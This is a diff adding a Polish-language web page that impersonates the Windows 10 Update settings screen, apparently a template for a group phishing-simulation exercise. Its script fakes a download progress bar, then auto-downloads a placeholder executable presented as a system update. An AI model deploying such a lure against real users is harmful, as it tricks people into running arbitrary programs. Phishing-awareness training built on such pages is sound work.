@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Windows Update</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
+  body { background: #f2f2f2; }
+  .win10 { background: #f2f2f2; min-height: 600px; display: flex; flex-direction: column; }
+  .titlebar {
+    background: #fff;
+    border-bottom: 1px solid #e0e0e0;
+    padding: 0 0 0 12px;
+    display: flex;
+    align-items: center;
+    height: 36px;
+    gap: 8px;
+  }
+  .titlebar-icon { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #444; flex: 1; }
+  .titlebar-btns { display: flex; height: 36px; }
+  .titlebar-btns button {
+    width: 46px; height: 36px; border: none; background: transparent;
+    font-size: 13px; color: #444; cursor: pointer;
+  }
+  .titlebar-btns button:hover { background: #e0e0e0; }
+  .titlebar-btns .close:hover { background: #e81123; color: #fff; }
+
+  .layout { display: flex; flex: 1; }
+
+  .sidebar {
+    width: 212px;
+    background: #fff;
+    border-right: 1px solid #e0e0e0;
+    padding-top: 8px;
+  }
+  .sidebar-item {
+    padding: 11px 20px;
+    font-size: 13px;
+    color: #333;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .sidebar-item:hover { background: #f2f2f2; }
+  .sidebar-item.active {
+    background: #e5f1fb;
+    border-left: 3px solid #0078d7;
+    color: #0078d7;
+    font-weight: 600;
+    padding-left: 17px;
+  }
+  .sidebar-item i { font-size: 16px; }
+
+  .content { flex: 1; padding: 32px 36px; }
+
+  .ms-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 28px;
+  }
+  .ms-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 3px; width: 28px; height: 28px; }
+  .ms-grid span { display: block; }
+  .ms-r { background: #f25022; }
+  .ms-g { background: #7fba00; }
+  .ms-b { background: #00a4ef; }
+  .ms-y { background: #ffb900; }
+  .ms-wordmark { font-size: 16px; font-weight: 300; color: #737373; letter-spacing: 0.5px; }
+
+  .page-title { font-size: 20px; font-weight: 400; color: #1a1a1a; margin-bottom: 6px; }
+  .page-sub { font-size: 13px; color: #767676; margin-bottom: 28px; }
+
+  .status-box {
+    background: #fff;
+    border: 1px solid #d6d6d6;
+    padding: 20px 22px;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 18px;
+  }
+  .status-icon { width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .icon-green { background: #dff0d4; }
+  .status-icon i { font-size: 24px; }
+  .green { color: #107c10; }
+
+  .status-text { flex: 1; }
+  .status-title { font-size: 15px; font-weight: 600; color: #1a1a1a; margin-bottom: 3px; }
+  .status-desc { font-size: 13px; color: #666; line-height: 1.5; }
+
+  .info-row { display: flex; gap: 0; margin-bottom: 20px; }
+  .info-item {
+    flex: 1;
+    background: #fff;
+    border: 1px solid #d6d6d6;
+    padding: 14px 18px;
+    margin-right: -1px;
+  }
+  .info-label { font-size: 11px; color: #767676; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 4px; }
+  .info-val { font-size: 14px; font-weight: 600; color: #1a1a1a; }
+
+  .section-label { font-size: 12px; font-weight: 600; color: #444; text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 10px; }
+
+  .update-item {
+    background: #fff;
+    border: 1px solid #d6d6d6;
+    padding: 14px 18px;
+    margin-bottom: 6px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+  .update-item i { font-size: 20px; color: #0078d7; flex-shrink: 0; }
+  .update-item-body { flex: 1; }
+  .update-name { font-size: 13px; font-weight: 600; color: #1a1a1a; }
+  .update-meta { font-size: 12px; color: #888; margin-top: 2px; }
+  .pill { font-size: 11px; font-weight: 600; padding: 3px 10px; border-radius: 2px; flex-shrink: 0; }
+  .pill-sec { background: #fde7e9; color: #a4262c; }
+  .pill-imp { background: #fff4ce; color: #7a4f00; }
+  .pill-opt { background: #dff0d4; color: #107c10; }
+
+  .actions { margin-top: 22px; display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+  .btn-blue {
+    background: #0078d7; color: #fff; border: none;
+    padding: 9px 24px; font-size: 13px; font-weight: 600; cursor: pointer;
+  }
+  .btn-blue:hover { background: #005a9e; }
+  .btn-blue:disabled { opacity: 0.6; cursor: not-allowed; }
+  .btn-outline {
+    background: #fff; color: #0078d7;
+    border: 1px solid #0078d7;
+    padding: 8px 20px; font-size: 13px; font-weight: 600; cursor: pointer;
+  }
+  .btn-outline:hover { background: #e3f2fd; }
+  .footer-note { font-size: 12px; color: #aaa; margin-left: auto; }
+  .divider { border: none; border-top: 1px solid #e0e0e0; margin: 20px 0; }
+
+  /* Pasek postępu */
+  .progress-area {
+    margin-top: 20px;
+    display: none;
+    background: #fff;
+    border: 1px solid #d6d6d6;
+    padding: 16px 18px;
+  }
+  .progress-bar-bg {
+    background: #e0e0e0;
+    height: 8px;
+    border-radius: 10px;
+    overflow: hidden;
+  }
+  .progress-fill {
+    background: #0078d7;
+    width: 0%;
+    height: 100%;
+    transition: width 0.2s ease;
+  }
+  .progress-status {
+    font-size: 12px;
+    color: #616161;
+    margin-top: 10px;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+<div class="win10">
+  <div class="titlebar">
+    <div class="titlebar-icon">
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5px;width:14px;height:14px;">
+        <span style="display:block;background:#f25022;"></span>
+        <span style="display:block;background:#7fba00;"></span>
+        <span style="display:block;background:#00a4ef;"></span>
+        <span style="display:block;background:#ffb900;"></span>
+      </div>
+      Ustawienia
+    </div>
+    <div class="titlebar-btns">
+      <button>─</button>
+      <button>□</button>
+      <button class="close">✕</button>
+    </div>
+  </div>
+
+  <div class="layout">
+    <div class="sidebar">
+      <div class="sidebar-item"><i class="ti ti-home"></i> Główna</div>
+      <div class="sidebar-item"><i class="ti ti-user"></i> System</div>
+      <div class="sidebar-item"><i class="ti ti-wifi"></i> Sieć i Internet</div>
+      <div class="sidebar-item"><i class="ti ti-apps"></i> Aplikacje</div>
+      <div class="sidebar-item"><i class="ti ti-shield"></i> Zabezpieczenia</div>
+      <div class="sidebar-item active"><i class="ti ti-refresh"></i> Windows Update</div>
+    </div>
+
+    <div class="content">
+      <div class="ms-logo">
+        <div class="ms-grid">
+          <span class="ms-r"></span>
+          <span class="ms-g"></span>
+          <span class="ms-b"></span>
+          <span class="ms-y"></span>
+        </div>
+        <span class="ms-wordmark">Microsoft</span>
+      </div>
+
+      <div class="page-title">Windows Update</div>
+      <div class="page-sub">Twoje urządzenie jest aktualne, ale dostępne są opcjonalne aktualizacje.</div>
+
+      <div class="status-box">
+        <div class="status-icon icon-green">
+          <i class="ti ti-circle-check green"></i>
+        </div>
+        <div class="status-text">
+          <div class="status-title">Jesteś na bieżąco</div>
+          <div class="status-desc">Ostatnia aktualizacja zabezpieczeń została zainstalowana pomyślnie. Poniżej dostępne są aktualizacje opcjonalne i sterowniki.</div>
+        </div>
+      </div>
+
+      <div class="info-row">
+        <div class="info-item">
+          <div class="info-label">Wersja systemu</div>
+          <div class="info-val">Windows 10 22H2</div>
+        </div>
+        <div class="info-item">
+          <div class="info-label">Ostatnie sprawdzenie</div>
+          <div class="info-val">Dzisiaj, 08:15</div>
+        </div>
+        <div class="info-item">
+          <div class="info-label">Ostatnia instalacja</div>
+          <div class="info-val">12.05.2026</div>
+        </div>
+      </div>
+
+      <hr class="divider">
+
+      <div class="section-label">Dostępne aktualizacje opcjonalne</div>
+
+      <div class="update-item">
+        <i class="ti ti-shield-check"></i>
+        <div class="update-item-body">
+          <div class="update-name">Aktualizacja zabezpieczeń — KB5037771</div>
+          <div class="update-meta">Rozmiar: 312 MB &nbsp;·&nbsp; 14.05.2026</div>
+        </div>
+        <span class="pill pill-sec">Zabezpieczenia</span>
+      </div>
+
+      <div class="update-item">
+        <i class="ti ti-package"></i>
+        <div class="update-item-body">
+          <div class="update-name">Aktualizacja zbiorcza Windows 10 — KB5037653</div>
+          <div class="update-meta">Rozmiar: 654 MB &nbsp;·&nbsp; 13.05.2026</div>
+        </div>
+        <span class="pill pill-imp">Ważna</span>
+      </div>
+
+      <div class="update-item">
+        <i class="ti ti-cpu"></i>
+        <div class="update-item-body">
+          <div class="update-name">Sterownik — Realtek Audio Driver 6.0.9427.1</div>
+          <div class="update-meta">Rozmiar: 48 MB &nbsp;·&nbsp; 09.05.2026</div>
+        </div>
+        <span class="pill pill-opt">Opcjonalna</span>
+      </div>
+
+      <div class="actions">
+        <button class="btn-blue" id="downloadBtn">Pobierz i zainstaluj</button>
+        <button class="btn-outline">Zaplanuj ponowne uruchomienie</button>
+        <span class="footer-note">© Microsoft Corporation</span>
+      </div>
+
+      <!-- Pasek postępu -->
+      <div class="progress-area" id="progressArea">
+        <div class="progress-bar-bg">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="progress-status" id="progressStatus"></div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+  // ==========================================================
+  // 🔧 TUTAJ PODMIEŃ ŚCIEŻKĘ DO PLIKU SWOJEJ GRUPY
+  // ==========================================================
+  const FILE_TO_DOWNLOAD = "pliki/aktualizacja_grupy.exe";
+  // ==========================================================
+
+  const downloadBtn = document.getElementById('downloadBtn');
+  const progressArea = document.getElementById('progressArea');
+  const progressFill = document.getElementById('progressFill');
+  const progressStatus = document.getElementById('progressStatus');
+
+  let isDownloading = false;
+
+  downloadBtn.addEventListener('click', () => {
+    if (isDownloading) return;
+    isDownloading = true;
+    progressArea.style.display = 'block';
+    downloadBtn.disabled = true;
+    downloadBtn.innerText = '⏳ Pobieranie w toku...';
+
+    let progress = 0;
+    const interval = setInterval(() => {
+      progress += Math.floor(Math.random() * 12) + 5;
+      if (progress >= 100) {
+        progress = 100;
+        clearInterval(interval);
+        progressFill.style.width = '100%';
+        progressStatus.innerText = '✅ Pobieranie zakończone. Instalowanie aktualizacji...';
+
+        setTimeout(() => {
+          const link = document.createElement('a');
+          link.href = FILE_TO_DOWNLOAD;
+          link.download = '';
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+          console.log(`[Symulacja] Pobrano plik: ${FILE_TO_DOWNLOAD}`);
+
+          setTimeout(() => {
+            progressStatus.innerText = '✅ Aktualizacja zainstalowana. Aby zakończyć, uruchom ponownie komputer.';
+            downloadBtn.disabled = false;
+            downloadBtn.style.opacity = '1';
+            downloadBtn.innerText = 'Pobierz i zainstaluj';
+            isDownloading = false;
+          }, 2000);
+        }, 500);
+      } else {
+        progressFill.style.width = progress + '%';
+        progressStatus.innerText = `Pobieranie... ${progress}%`;
+      }
+    }, 60);
+  });
+</script>
+
+</body>
+</html>
